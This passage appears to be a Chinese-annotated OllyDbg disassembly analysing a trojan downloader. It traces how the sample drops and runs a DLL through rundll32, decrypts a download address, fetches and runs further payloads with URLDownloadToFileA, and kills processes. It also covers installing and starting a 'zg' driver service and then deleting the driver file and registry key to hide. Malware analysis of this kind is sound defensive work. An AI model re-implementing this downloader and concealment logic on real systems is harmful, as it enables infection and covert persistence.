00415F89   |.  EB 05          |jmp short orz18.00415F90  
00415F8B   |>  C64424 13 01   |mov byte ptr ss:\[esp+13\],1  
00415F90   |>  8B5424 14      |mov edx,dword ptr ss:\[esp+14\]  
00415F94   |.  8D4C24 18      |lea ecx,dword ptr ss:\[esp+18\]  
00415F98   |.  51             |push ecx                                 ; /pProcessentry  
00415F99   |.  52             |push edx                                 ; |hSnapshot  
00415F9A   |.  C605 22D74000 >|mov byte ptr ds:\[40D722\],0               ; |  
00415FA1   |.  E8 4A030000    |call orz18.004162F0                      ; \\Process32Next  
00415FA6   |.  85C0           |test eax,eax  
00415FA8   |.^ 0F85 60FFFFFF  \\jnz orz18.00415F0E  
00415FAE   |.  8B7424 14      mov esi,dword ptr ss:\[esp+14\]  
00415FB2   |.  5F             pop edi  
00415FB3   |.  5D             pop ebp  
00415FB4   |.  5B             pop ebx  
00415FB5   |>  56             push esi                                  ; /hObject  
00415FB6   |.  FF15 AC104000  call dword ptr ds:\[4010AC\]                ; \\CloseHandle  
00415FBC   |.  8A4424 07      mov al,byte ptr ss:\[esp+7\]  
00415FC0   |.  5E             pop esi  
00415FC1   |.  81C4 30010000  add esp,130  
00415FC7   \\.  C3             retn  
  
  
}  
  
18 创建文件 C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\\\12234.dll  
00415E7A   |.  E8 41EAFFFF    call orz18.004148C0  创建  
00415E84   |.  E8 D7FEFFFF    call orz18.00415D60  给文件加 MZ  
  
执行 rundll32.exe....C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\\\12234.dll  
  
00415EA1   |.  6A 00          push 0                               ; /IsShown = 0  
00415EA3   |.  6A 00          push 0                               ; |DefDir = NULL  
00415EA5   |.  50             push eax                             ; |Parameters  
00415EA6   |.  51             push ecx                             ; |FileName  
00415EA7   |.  68 58664100    push orz18.00416658                  ; |Operation = ""  
00415EAC   |.  6A 00          push 0                               ; |hWnd = NULL  
00415EAE   |.  FF15 E0104000  call dword ptr ds:\[4010E0\]           ; \\ShellExecuteA  
  
  
  
19 通过本进程 ID 得到 进程结构  
{  
00415CE3   |.  50             push eax                             ; /pProcessentry  
00415CE4   |.  56             push esi                             ; |hSnapshot  
00415CE5   |.  E8 0C060000    call orz18.004162F6                  ; \\Process32First  
00415CEA   |.  85C0           test eax,eax  
00415CEC   |.  74 21          je short orz18.00415D0F  
00415CEE   |.  8B3D 5C104000  mov edi,dword ptr ds:\[40105C\]        ;  kernel32.GetCurrentProcessId  
00415CF4   |.  FFD7           call edi                             ; \[GetCurrentProcessId  
00415CF6   |.  394424 10      cmp dword ptr ss:\[esp+10\],eax  
00415CFA   |.  74 13          je short orz18.00415D0F  
00415CFC   |>  8D4C24 08      /lea ecx,dword ptr ss:\[esp+8\]  
00415D00   |.  51             |push ecx                            ; /pProcessentry  
00415D01   |.  56             |push esi                            ; |hSnapshot  
00415D02   |.  E8 E9050000    |call orz18.004162F0                 ; \\Process32Next  
00415D07   |.  FFD7           |call edi                            ;  kernel32.GetCurrentProcessId  
00415D09   |.  394424 10      |cmp dword ptr ss:\[esp+10\],eax  
00415D0D   |.^ 75 ED          \\jnz short orz18.00415CFC  
  
  
}  
20  
{  
0041602F   /$  55             push ebp  
00416030   |.  8BEC           mov ebp,esp  
00416032   |.  81EC 08010000  sub esp,108  
00416038   |.  56             push esi  
00416039   |.  57             push edi  
0041603A   |.  8D85 F8FEFFFF  lea eax,dword ptr ss:\[ebp-108\]  
00416040   |.  68 04010000    push 104                             ; /BufSize = 104 (260.)  
00416045   |.  33F6           xor esi,esi                          ; |  
00416047   |.  50             push eax                             ; |PathBuffer  
00416048   |.  56             push esi                             ; |hModule => NULL  
00416049   |.  FF15 6C104000  call dword ptr ds:\[40106C\]           ; \\GetModuleFileNameA  
0041604F   |.  68 60EA0000    push 0EA60                           ; /Timeout = 60000. ms  
00416054   |.  FF15 88104000  call dword ptr ds:\[401088\]           ; \\Sleep  
0041605A   |.  56             push esi                             ; /Style => MB\_OK|MB\_APPLMODAL  
0041605B   |.  68 58664100    push orz18.00416658                  ; |Title = ""  
00416060   |.  68 DC434100    push orz18.004143DC                  ; |Text = "..."  
00416065   |.  6A FF          push -1                              ; |hOwner = FFFFFFFF  
00416067   |.  FF15 24114000  call dword ptr ds:\[401124\]           ; \\MessageBoxA  
0041606D   |.  56             push esi                             ; /pThreadId => NULL  
0041606E   |.  56             push esi                             ; |CreationFlags => 0  
0041606F   |.  56             push esi                             ; |pThreadParm => NULL  
00416070   |.  68 30574100    push orz18.00415730                  ; |ThreadFunction = orz18.00415730  
00416075   |.  56             push esi                             ; |StackSize => 0  
00416076   |.  56             push esi                             ; |pSecurity => NULL  
00416077   |.  FF15 34104000  call dword ptr ds:\[401034\]           ; \\CreateThread  
0041607D   |.  6A 04          push 4                               ; /Flags = DELAY\_UNTIL\_REBOOT  
0041607F   |.  8D85 F8FEFFFF  lea eax,dword ptr ss:\[ebp-108\]       ; |  
00416085   |.  56             push esi                             ; |NewName => NULL //  
00416086   |.  50             push eax                             ; |ExistingName  
00416087   |.  FF15 50104000  call dword ptr ds:\[401050\]           ; \\MoveFileExA  
0041608D   |.  E8 DEFAFFFF    call orz18.00415B70                   //提高进程权限  
00416092   |.  68 48644100    push orz18.00416448                  ;  ASCII "C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\1696"  
00416097   |.  E8 34FFFFFF    call orz18.00415FD0  
0041609C   |.  59             pop ecx  
0041609D   |.  56             push esi                             ; /hTemplateFile => NULL  
0041609E   |.  56             push esi                             ; |Attributes => 0  
0041609F   |.  6A 03          push 3                               ; |Mode = OPEN\_EXISTING  
004160A1   |.  56             push esi                             ; |pSecurity => NULL  
004160A2   |.  56             push esi                             ; |ShareMode => 0  
004160A3   |.  68 00000080    push 80000000                        ; |Access = GENERIC\_READ  
004160A8   |.  68 CC434100    push orz18.004143CC                  ; |FileName = "\\\\.\\safebreas"  
004160AD   |.  FF15 A0104000  call dword ptr ds:\[4010A0\]           ; \\CreateFileA  
004160B3   |.  8BF8           mov edi,eax  
004160B5   |.  83FF FF        cmp edi,-1  
004160B8   |.  74 1D          je short orz18.004160D7  
004160BA   |.  8D45 FC        lea eax,dword ptr ss:\[ebp-4\]  
004160BD   |.  56             push esi                             ; /pOverlapped => NULL  
004160BE   |.  50             push eax                             ; |pBytesReturned  
004160BF   |.  56             push esi                             ; |OutBufferSize => 0  
004160C0   |.  56             push esi                             ; |OutBuffer => NULL  
004160C1   |.  68 00320000    push 3200                            ; |InBufferSize = 3200 (12800.)  
004160C6   |.  68 A4014100    push orz18.004101A4                  ; |InBuffer = orz18.004101A4  
004160CB   |.  68 1C002200    push 22001C                          ; |IoControlCode = 22001C  
004160D0   |.  57             push edi                             ; |hDevice  
004160D1   |.  FF15 68104000  call dword ptr ds:\[401068\]           ; \\DeviceIoControl  
004160D7   |>  57             push edi                             ; /hObject  
004160D8   |.  FF15 AC104000  call dword ptr ds:\[4010AC\]           ; \\CloseHandle  
004160DE   |.  5F             pop edi  
004160DF   |.  33C0           xor eax,eax  
004160E1   |.  5E             pop esi  
004160E2   |.  C9             leave  
004160E3   \\.  C3             retn  
  
  
}  
21 线程函数 生成随机的 DLL 文件 C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\5dc2de.dll  
   call orz18.00414920 下载地址被解密  
  
  
00416070   |.  68 30574100    push orz18.00415730                  ; |ThreadFunction = orz18.00415730  
  
{  
00415730   /.  55             push ebp  
00415731   |.  8BEC           mov ebp,esp  
00415733   |.  81EC 04010000  sub esp,104  
00415739   |.  8D85 FCFEFFFF  lea eax,dword ptr ss:\[ebp-104\]  
0041573F   |.  56             push esi  
00415740   |.  50             push eax                          ; /Buffer  
00415741   |.  68 04010000    push 104                          ; |BufSize = 104 (260.)  
00415746   |.  FF15 2C104000  call dword ptr ds:\[40102C\]        ; \\GetTempPathA  
0041574C   |.  FF15 28104000  call dword ptr ds:\[401028\]        ; \[GetTickCount  
00415752   |.  50             push eax                          ; /<%x>  
00415753   |.  8D85 FCFEFFFF  lea eax,dword ptr ss:\[ebp-104\]    ; |  
00415759   |.  50             push eax                          ; |<%s>  
0041575A   |.  BE 3C634100    mov esi,orz18.0041633C            ; |  
0041575F   |.  68 38434100    push orz18.00414338               ; |Format = "%s%x.dll"  
00415764   |.  56             push esi                          ; |s => orz18.0041633C  
00415765   |.  FF15 10114000  call dword ptr ds:\[401110\]        ; \\wsprintfA  
0041576B   |.  56             push esi  
0041576C   |.  E8 A3ECFFFF    call orz18.00414414  
00415771   |.  83C4 14        add esp,14  
00415774   |.  84C0           test al,al  
00415776   |.  75 07          jnz short orz18.0041577F  
00415778   |.  33C0           xor eax,eax  
0041577A   |.  E9 B0000000    jmp orz18.0041582F  
0041577F   |>  53             push ebx  
00415780   |.  57             push edi  
00415781   |.  68 08404100    push orz18.00414008  
00415786   |.  E8 95F1FFFF    call orz18.00414920  
0041578B   |.  C70424 A43F410>mov dword ptr ss:\[esp\],orz18.0041>  
00415792   |.  E8 89F1FFFF    call orz18.00414920               //下载地址被解密  
00415797   |.  E8 B4F9FFFF    call orz18.00415150               //下载木马  
0041579C   |.  8B35 88104000  mov esi,dword ptr ds:\[401088\]     ; |kernel32.Sleep  
004157A2   |.  C70424 50C3000>mov dword ptr ss:\[esp\],0C350      ; |  
004157A9   |.  FFD6           call esi                          ; \\Sleep  
004157AB   |.  68 78404100    push orz18.00414078  
004157B0   |.  E8 6BF1FFFF    call orz18.00414920  
004157B5   |.  59             pop ecx  
004157B6   |.  E8 95FDFFFF    call orz18.00415550  
004157BB   |.  E8 4DF3FFFF    call orz18.00414B0D  
004157C0   |.  BF F4010000    mov edi,1F4  
004157C5   |.  57             push edi                          ; /Timeout => 500. ms  
004157C6   |.  FFD6           call esi                          ; \\Sleep  
004157C8   |.  33DB           xor ebx,ebx  
004157CA   |.  53             push ebx                          ; /pThreadId => NULL  
004157CB   |.  53             push ebx                          ; |CreationFlags => 0  
004157CC   |.  53             push ebx                          ; |pThreadParm => NULL  
004157CD   |.  68 B3554100    push orz18.004155B3               ; |ThreadFunction = orz18.004155B3  
004157D2   |.  53             push ebx                          ; |StackSize => 0  
004157D3   |.  53             push ebx                          ; |pSecurity => NULL  
004157D4   |.  FF15 34104000  call dword ptr ds:\[401034\]        ; \\CreateThread  
004157DA   |.  57             push edi                          ; /Timeout => 500. ms  
004157DB   |.  FFD6           call esi                          ; \\Sleep  
004157DD   |.  A1 48414100    mov eax,dword ptr ds:\[414148\]  
004157E2   |.  3D 0F270000    cmp eax,270F  
004157E7   |.  7D 18          jge short orz18.00415801  
004157E9   |.  33FF           xor edi,edi  
004157EB   |.  3BC3           cmp eax,ebx  
004157ED   |.  7E 1F          jle short orz18.0041580E  
004157EF   |>  68 60EA0000    /push 0EA60  
004157F4   |.  FFD6           |call esi  
004157F6   |.  47             |inc edi  
004157F7   |.  3B3D 48414100  |cmp edi,dword ptr ds:\[414148\]  
004157FD   |.^ 7C F0          \\jl short orz18.004157EF  
004157FF   |.  EB 0D          jmp short orz18.0041580E  
00415801   |>  6A 1E          push 1E  
00415803   |.  5F             pop edi  
00415804   |>  68 60EA0000    /push 0EA60  
00415809   |.  FFD6           |call esi  
0041580B   |.  4F             |dec edi  
0041580C   |.^ 75 F6          \\jnz short orz18.00415804  
0041580E   |>  BE 4C414100    mov esi,orz18.0041414C  
00415813   |.  56             push esi  
00415814   |.  E8 97F1FFFF    call orz18.004149B0  
00415819   |.  C70424 F842410>mov dword ptr ss:\[esp\],orz18.0041>;  ASCII "aaa"  
00415820   |.  6A 42          push 42  
00415822   |.  56             push esi  
00415823   |.  E8 18F3FFFF    call orz18.00414B40  
00415828   |.  83C4 0C        add esp,0C  
0041582B   |.  33C0           xor eax,eax  
0041582D   |.  5F             pop edi  
0041582E   |.  5B             pop ebx  
0041582F   |>  5E             pop esi  
00415830   |.  C9             leave  
00415831   \\.  C2 0400        retn 4  
  
  
}  
  
22 把 txt 文件下载到 C:\\windows\\system32\\    名字 asdfasdf  
{  
00414B40   /$  55             push ebp  
00414B41   |.  8BEC           mov ebp,esp  
00414B43   |.  81EC 0C020000  sub esp,20C  
00414B49   |.  53             push ebx  
00414B4A   |.  56             push esi  
00414B4B   |.  57             push edi  
00414B4C   |.  6A 2E          push 2E                           ; /c = 2E  ('.')  
00414B4E   |.  FF75 08        push dword ptr ss:\[ebp+8\]         ; |s  
00414B51   |.  E8 BE170000    call orz18.00416314               ; \\strrchr  
00414B56   |.  8B35 24114000  mov esi,dword ptr ds:\[401124\]     ;  USER32.MessageBoxA  
00414B5C   |.  59             pop ecx  
00414B5D   |.  59             pop ecx  
00414B5E   |.  33DB           xor ebx,ebx  
00414B60   |.  53             push ebx                          ; /Style => MB\_OK|MB\_APPLMODAL  
00414B61   |.  68 10424100    push orz18.00414210               ; |Title = "pppppppp"  
00414B66   |.  68 04424100    push orz18.00414204               ; |Text = "iiiiiooooo"  
00414B6B   |.  6A FA          push -6                           ; |hOwner = FFFFFFFA  
00414B6D   |.  8945 FC        mov dword ptr ss:\[ebp-4\],eax      ; |  
00414B70   |.  FFD6           call esi                          ; \\MessageBoxA  
00414B72   |.  395D FC        cmp dword ptr ss:\[ebp-4\],ebx  
00414B75   |.  0F84 A2010000  je orz18.00414D1D  
00414B7B   |.  8B7D 10        mov edi,dword ptr ss:\[ebp+10\]  
00414B7E   |.  FF45 FC        inc dword ptr ss:\[ebp-4\]  
00414B81   |.  83C9 FF        or ecx,FFFFFFFF  
00414B84   |.  33C0           xor eax,eax  
00414B86   |.  F2:AE          repne scas byte ptr es:\[edi\]  
00414B88   |.  F7D1           not ecx  
00414B8A   |.  49             dec ecx  
00414B8B   |.  83F9 04        cmp ecx,4  
00414B8E   |.  76 34          jbe short orz18.00414BC4  
00414B90   |.  33F6           xor esi,esi  
00414B92   |>  53             /push ebx  
00414B93   |.  53             |push ebx  
00414B94   |.  FF75 10        |push dword ptr ss:\[ebp+10\]  
00414B97   |.  FF75 08        |push dword ptr ss:\[ebp+8\]  
00414B9A   |.  53             |push ebx  
00414B9B   |.  FF15 50654100  |call dword ptr ds:\[416550\]       ;  urlmon.URLDownloadToFileA  
00414BA1   |.  3BC3           |cmp eax,ebx  
00414BA3   |.  A3 40644100    |mov dword ptr ds:\[416440\],eax  
00414BA8   |.  0F84 6F010000  |je orz18.00414D1D  
00414BAE   |.  68 88130000    |push 1388                        ; /Timeout = 5000. ms  
00414BB3   |.  FF15 88104000  |call dword ptr ds:\[401088\]       ; \\Sleep  
00414BB9   |.  46             |inc esi  
00414BBA   |.  83FE 64        |cmp esi,64  
00414BBD   |.^ 72 D3          \\jb short orz18.00414B92  
00414BBF   |.  E9 59010000    jmp orz18.00414D1D  
00414BC4   |>  68 B0424100    push orz18.004142B0               ; /s2 = "ini"  
00414BC9   |.  FF75 FC        push dword ptr ss:\[ebp-4\]         ; |s1  
00414BCC   |.  E8 5F170000    call orz18.00416330               ; \\\_stricmp  
00414BD1   |.  59             pop ecx  
00414BD2   |.  85C0           test eax,eax  
00414BD4   |.  59             pop ecx  
00414BD5   |.  74 17          je short orz18.00414BEE  
00414BD7   |.  68 AC424100    push orz18.004142AC               ; /s2 = "txt"  
00414BDC   |.  FF75 FC        push dword ptr ss:\[ebp-4\]         ; |s1  
00414BDF   |.  E8 4C170000    call orz18.00416330               ; \\\_stricmp  
00414BE4   |.  59             pop ecx  
00414BE5   |.  85C0           test eax,eax  
00414BE7   |.  59             pop ecx  
00414BE8   |.  0F85 A1000000  jnz orz18.00414C8F  
00414BEE   |>  8D85 F4FDFFFF  lea eax,dword ptr ss:\[ebp-20C\]  
00414BF4   |.  68 04010000    push 104                          ; /BufSize = 104 (260.)  
00414BF9   |.  50             push eax                          ; |Buffer  
00414BFA   |.  FF15 30104000  call dword ptr ds:\[401030\]        ; \\GetSystemDirectoryA  
00414C00   |.  BF A0424100    mov edi,orz18.004142A0            ;  ASCII "\\asdfasdf"  
00414C05   |.  83C9 FF        or ecx,FFFFFFFF  
00414C08   |.  33C0           xor eax,eax  
00414C0A   |.  8D95 F4FDFFFF  lea edx,dword ptr ss:\[ebp-20C\]  
00414C10   |.  F2:AE          repne scas byte ptr es:\[edi\]  
00414C12   |.  F7D1           not ecx  
00414C14   |.  2BF9           sub edi,ecx  
00414C16   |.  8BF7           mov esi,edi  
00414C18   |.  8BFA           mov edi,edx  
00414C1A   |.  8BD1           mov edx,ecx  
00414C1C   |.  83C9 FF        or ecx,FFFFFFFF  
00414C1F   |.  F2:AE          repne scas byte ptr es:\[edi\]  
00414C21   |.  8BCA           mov ecx,edx  
00414C23   |.  4F             dec edi  
00414C24   |.  C1E9 02        shr ecx,2  
00414C27   |.  F3:A5          rep movs dword ptr es:\[edi\],dword>  
00414C29   |.  8BCA           mov ecx,edx  
00414C2B   |.  8D95 F8FEFFFF  lea edx,dword ptr ss:\[ebp-108\]  
00414C31   |.  83E1 03        and ecx,3  
00414C34   |.  F3:A4          rep movs byte ptr es:\[edi\],byte p>  
00414C36   |.  8DBD F4FDFFFF  lea edi,dword ptr ss:\[ebp-20C\]  
00414C3C   |.  83C9 FF        or ecx,FFFFFFFF  
00414C3F   |.  F2:AE          repne scas byte ptr es:\[edi\]  
00414C41   |.  F7D1           not ecx  
00414C43   |.  2BF9           sub edi,ecx  
00414C45   |.  8BC1           mov eax,ecx  
00414C47   |.  8BF7           mov esi,edi  
00414C49   |.  8BFA           mov edi,edx  
00414C4B   |.  C1E9 02        shr ecx,2  
00414C4E   |.  F3:A5          rep movs dword ptr es:\[edi\],dword>  
00414C50   |.  8BC8           mov ecx,eax  
00414C52   |.  83E1 03        and ecx,3  
00414C55   |.  F3:A4          rep movs byte ptr es:\[edi\],byte p>  
00414C57   |.  33F6           xor esi,esi  
00414C59   |>  53             /push ebx  
00414C5A   |.  8D85 F8FEFFFF  |lea eax,dword ptr ss:\[ebp-108\]  
00414C60   |.  53             |push ebx  
00414C61   |.  50             |push eax                         ;  C:\\windows\\system32\\asdfasdf  
00414C62   |.  FF75 08        |push dword ptr ss:\[ebp+8\]  
00414C65   |.  53             |push ebx  
00414C66   |.  FF15 50654100  |call dword ptr ds:\[416550\]       ;  urlmon.URLDownloadToFileA  
00414C6C   |.  3BC3           |cmp eax,ebx  
00414C6E   |.  A3 40644100    |mov dword ptr ds:\[416440\],eax  
00414C73   |.  0F84 A4000000  |je orz18.00414D1D  
00414C79   |.  68 E02E0000    |push 2EE0                        ; /Timeout = 12000. ms  
00414C7E   |.  FF15 88104000  |call dword ptr ds:\[401088\]       ; \\Sleep  
00414C84   |.  46             |inc esi  
00414C85   |.  83FE 64        |cmp esi,64  
00414C88   |.^ 72 CF          \\jb short orz18.00414C59  
00414C8A   |.  E9 8E000000    jmp orz18.00414D1D  
00414C8F   |>  8D85 F4FDFFFF  lea eax,dword ptr ss:\[ebp-20C\]  
00414C95   |.  50             push eax                          ; /Buffer  
00414C96   |.  68 04010000    push 104                          ; |BufSize = 104 (260.)  
00414C9B   |.  FF15 2C104000  call dword ptr ds:\[40102C\]        ; \\GetTempPathA  
00414CA1   |.  FF15 28104000  call dword ptr ds:\[401028\]        ; \[GetTickCount  
00414CA7   |.  0345 0C        add eax,dword ptr ss:\[ebp+C\]  
00414CAA   |.  50             push eax                          ; /<%d>  
00414CAB   |.  8D85 F4FDFFFF  lea eax,dword ptr ss:\[ebp-20C\]    ; |  
00414CB1   |.  50             push eax                          ; |<%s>  
00414CB2   |.  8D85 F8FEFFFF  lea eax,dword ptr ss:\[ebp-108\]    ; |  
00414CB8   |.  68 98424100    push orz18.00414298               ; |Format = "%s%d"  
00414CBD   |.  50             push eax                          ; |s  
00414CBE   |.  FF15 10114000  call dword ptr ds:\[401110\]        ; \\wsprintfA  
00414CC4   |.  83C4 10        add esp,10  
00414CC7   |.  8D85 F8FEFFFF  lea eax,dword ptr ss:\[ebp-108\]  
00414CCD   |.  53             push ebx  
00414CCE   |.  50             push eax  
00414CCF   |.  FF75 08        push dword ptr ss:\[ebp+8\]  
00414CD2   |.  6A F8          push -8  
00414CD4   |.  FFD6           call esi  
00414CD6   |.  33F6           xor esi,esi  
00414CD8   |>  53             /push ebx  
00414CD9   |.  8D85 F8FEFFFF  |lea eax,dword ptr ss:\[ebp-108\]  
00414CDF   |.  53             |push ebx  
00414CE0   |.  50             |push eax  
00414CE1   |.  FF75 08        |push dword ptr ss:\[ebp+8\]  
00414CE4   |.  53             |push ebx  
00414CE5   |.  FF15 50654100  |call dword ptr ds:\[416550\]       ;  urlmon.URLDownloadToFileA  
00414CEB   |.  3BC3           |cmp eax,ebx  
00414CED   |.  A3 40644100    |mov dword ptr ds:\[416440\],eax  
00414CF2   |.  74 11          |je short orz18.00414D05  
00414CF4   |.  68 E8030000    |push 3E8                         ; /Timeout = 1000. ms  
00414CF9   |.  FF15 88104000  |call dword ptr ds:\[401088\]       ; \\Sleep  
00414CFF   |.  46             |inc esi  
00414D00   |.  83FE 1E        |cmp esi,1E  
00414D03   |.^ 72 D3          \\jb short orz18.00414CD8  
00414D05   |>  83FE 1E        cmp esi,1E  
00414D08   |.  74 13          je short orz18.00414D1D  
00414D0A   |.  8D85 F8FEFFFF  lea eax,dword ptr ss:\[ebp-108\]  
00414D10   |.  50             push eax  
00414D11   |.  68 3C634100    push orz18.0041633C               ;  ASCII "C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\5dc2de.dll"  
00414D16   |.  E8 15FDFFFF    call orz18.00414A30               //运行下栽程序  
00414D1B   |.  59             pop ecx  
00414D1C   |.  59             pop ecx  
00414D1D   |>  5F             pop edi  
00414D1E   |.  5E             pop esi  
00414D1F   |.  5B             pop ebx  
00414D20   |.  C9             leave  
00414D21   \\.  C3             retn  
  
  
}  
  
23 下载过程  
{  
00414A31     FF7424 08        push dword ptr ss:\[esp+8\]  
00414A35     FF15 80104000    call dword ptr ds:\[401080\]       ; kernel32.LoadLibraryA  
00414A3B     8BF0             mov esi,eax  
00414A3D     85F6             test esi,esi  
00414A3F     74 1E            je short orz18.00414A5F  
00414A41     68 88424100      push orz18.00414288              ; ASCII "Winext"  //下载函数  
00414A46     56               push esi  
00414A47     FF15 84104000    call dword ptr ds:\[401084\]       ; kernel32.GetProcAddress  
00414A4D     85C0             test eax,eax  
}  
24   
{  
00416235   |.  56             push esi                                             ; /pThreadId  
00416236   |.  56             push esi                                             ; |CreationFlags  
00416237   |.  56             push esi                                             ; |pThreadParm  
00416238   |.  68 61444100    push orz18.00414461                                  ; |ThreadFunction = orz18.00414461  
0041623D   |.  56             push esi                                             ; |StackSize  
0041623E   |.  56             push esi                                             ; |pSecurity  
0041623F   |.  FF15 34104000  call dword ptr ds:\[401034\]                           ; \\CreateThread  
00416245   |.  53             push ebx          
00416246   |.  FFD7           call edi                                              / /结束进程 thunder5.exe cmd.exe  
00416248   |.  E8 E2FDFFFF    call orz18.0041602F  
}  
  
00416248   |.  E8 E2FDFFFF    call orz18.0041602F  
{  
25  
0041602F   /$  55             push ebp  
00416030   |.  8BEC           mov ebp,esp  
00416032   |.  81EC 08010000  sub esp,108  
00416038   |.  56             push esi  
00416039   |.  57             push edi  
0041603A   |.  8D85 F8FEFFFF  lea eax,dword ptr ss:\[ebp-108\]  
00416040   |.  68 04010000    push 104                                  ; /BufSize = 104 (260.)  
00416045   |.  33F6           xor esi,esi                               ; |  
00416047   |.  50             push eax                                  ; |PathBuffer  
00416048   |.  56             push esi                                  ; |hModule => NULL  
00416049   |.  FF15 6C104000  call dword ptr ds:\[40106C\]                ; \\GetModuleFileNameA  
0041604F   |.  68 60EA0000    push 0EA60                                ; /Timeout = 60000. ms  
00416054   |.  FF15 88104000  call dword ptr ds:\[401088\]                ; \\Sleep  
0041605A   |.  56             push esi                                  ; /Style => MB\_OK|MB\_APPLMODAL  
0041605B   |.  68 58664100    push orz18.00416658                       ; |Title = ""  
00416060   |.  68 DC434100    push orz18.004143DC                       ; |Text = "..."  
00416065   |.  6A FF          push -1                                   ; |hOwner = FFFFFFFF  
00416067   |.  FF15 24114000  call dword ptr ds:\[401124\]                ; \\MessageBoxA  
0041606D   |.  56             push esi                                  ; /pThreadId => NULL  
0041606E   |.  56             push esi                                  ; |CreationFlags => 0  
0041606F   |.  56             push esi                                  ; |pThreadParm => NULL  
00416070   |.  68 30574100    push orz18.00415730                       ; |ThreadFunction = orz18.00415730  
00416075   |.  56             push esi                                  ; |StackSize => 0  
00416076   |.  56             push esi                                  ; |pSecurity => NULL  
00416077   |.  FF15 34104000  call dword ptr ds:\[401034\]                ; \\CreateThread  
0041607D   |.  6A 04          push 4                                    ; /Flags = DELAY\_UNTIL\_REBOOT  
0041607F   |.  8D85 F8FEFFFF  lea eax,dword ptr ss:\[ebp-108\]            ; |  
00416085   |.  56             push esi                                  ; |NewName => NULL  
00416086   |.  50             push eax                                  ; |ExistingName  
00416087   |.  FF15 50104000  call dword ptr ds:\[401050\]                ; \\MoveFileExA  
0041608D   |.  E8 DEFAFFFF    call orz18.00415B70  
00416092   |.  68 48644100    push orz18.00416448                       ;  ASCII "C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\1696"  
00416097   |.  E8 34FFFFFF    call orz18.00415FD0  
0041609C   |.  59             pop ecx  
0041609D   |.  56             push esi                                  ; /hTemplateFile => NULL  
0041609E   |.  56             push esi                                  ; |Attributes => 0  
0041609F   |.  6A 03          push 3                                    ; |Mode = OPEN\_EXISTING  
004160A1   |.  56             push esi                                  ; |pSecurity => NULL  
004160A2   |.  56             push esi                                  ; |ShareMode => 0  
004160A3   |.  68 00000080    push 80000000                             ; |Access = GENERIC\_READ  
004160A8   |.  68 CC434100    push orz18.004143CC                       ; |FileName = "\\\\.\\safebreas"  
004160AD   |.  FF15 A0104000  call dword ptr ds:\[4010A0\]                ; \\CreateFileA 访问 \\\\.\\safebreas" 设备，该设备由 1696 驱动产生  
004160B3   |.  8BF8           mov edi,eax  
004160B5   |.  83FF FF        cmp edi,-1  
004160B8   |.  74 1D          je short orz18.004160D7  
004160BA   |.  8D45 FC        lea eax,dword ptr ss:\[ebp-4\]  
004160BD   |.  56             push esi                                  ; /pOverlapped => NULL  
004160BE   |.  50             push eax                                  ; |pBytesReturned  
004160BF   |.  56             push esi                                  ; |OutBufferSize => 0  
004160C0   |.  56             push esi                                  ; |OutBuffer => NULL  
004160C1   |.  68 00320000    push 3200                                 ; |InBufferSize = 3200 (12800.)  
004160C6   |.  68 A4014100    push orz18.004101A4                       ; |InBuffer = orz18.004101A4  
004160CB   |.  68 1C002200    push 22001C                               ; |IoControlCode = 22001C  
004160D0   |.  57             push edi                                  ; |hDevice  
004160D1   |.  FF15 68104000  call dword ptr ds:\[401068\]                ; \\DeviceIoControl  
004160D7   |>  57             push edi                                  ; /hObject  
004160D8   |.  FF15 AC104000  call dword ptr ds:\[4010AC\]                ; \\CloseHandle  
004160DE   |.  5F             pop edi  
004160DF   |.  33C0           xor eax,eax  
004160E1   |.  5E             pop esi  
004160E2   |.  C9             leave  
004160E3   \\.  C3             retn  
  
  
  
}  
26 尝试打开 zg 服务，如果失败，则新建一个叫 zg 的服务，指向创建的 1696 文件。并启动该服务  
   启动完成以后，立即删除该 1696 文件，并使用 SHDeleteKey 完全删除注册表项目："SYSTEM\\CurrentControlSet\\Services\\zg  
{  
00415FD0   /$  55             push ebp  
00415FD1   |.  8BEC           mov ebp,esp  
00415FD3   |.  83EC 1C        sub esp,1C  
00415FD6   |.  56             push esi  
00415FD7   |.  FF75 08        push dword ptr ss:\[ebp+8\]  
00415FDA   |.  68 C8434100    push orz18.004143C8                       ;  ASCII "zg"  
00415FDF   |.  E8 44FCFFFF    call orz18.00415C28  
00415FE4   |.  8BF0           mov esi,eax  
00415FE6   |.  59             pop ecx  
00415FE7   |.  85F6           test esi,esi  
00415FE9   |.  59             pop ecx  
00415FEA   |.  74 27          je short orz18.00416013  
00415FEC   |.  8D45 E4        lea eax,dword ptr ss:\[ebp-1C\]  
00415FEF   |.  50             push eax  
00415FF0   |.  56             push esi  
00415FF1   |.  FF15 08104000  call dword ptr ds:\[401008\]                ;  ADVAPI32.QueryServiceStatus  
00415FF7   |.  85C0           test eax,eax  
00415FF9   |.  74 06          je short orz18.00416001  
00415FFB   |.  837D E8 04     cmp dword ptr ss:\[ebp-18\],4  
00415FFF   |.  74 0B          je short orz18.0041600C  
00416001   |>  6A 00          push 0  
00416003   |.  6A 00          push 0  
00416005   |.  56             push esi  
00416006   |.  FF15 04104000  call dword ptr ds:\[401004\]                ;  ADVAPI32.StartServiceA  
0041600C   |>  56             push esi  
0041600D   |.  FF15 18104000  call dword ptr ds:\[401018\]                ;  ADVAPI32.CloseServiceHandle  
00416013   |>  FF75 08        push dword ptr ss:\[ebp+8\]                 ; /FileName  
00416016   |.  FF15 7C104000  call dword ptr ds:\[40107C\]                ; \\DeleteFileA  
0041601C   |.  68 A0434100    push orz18.004143A0                       ; /SubKey = "SYSTEM\\CurrentControlSet\\Services\\zg"  
00416021   |.  68 02000080    push 80000002                             ; |hKey = HKEY\_LOCAL\_MACHINE  
00416026   |.  FF15 E8104000  call dword ptr ds:\[4010E8\]                ; \\SHDeleteKeyA  
0041602C   |.  5E             pop esi  
0041602D   |.  C9             leave  
0041602E   \\.  C3             retn  
  
  
}  
  
数据还原  
{  
00414988   |. /74 1F          je short orz18.004149A9  
0041498A   |> |8A0C32         /mov cl,byte ptr ds:\[edx+esi\]  
0041498D   |. |8AC2           |mov al,dl  
0041498F   |. |2C 3B          |sub al,3B  
00414991   |. |8BFE           |mov edi,esi  
00414993   |. |D0E0           |shl al,1  
00414995   |. |02C8           |add cl,al  
00414997   |. |33C0           |xor eax,eax  
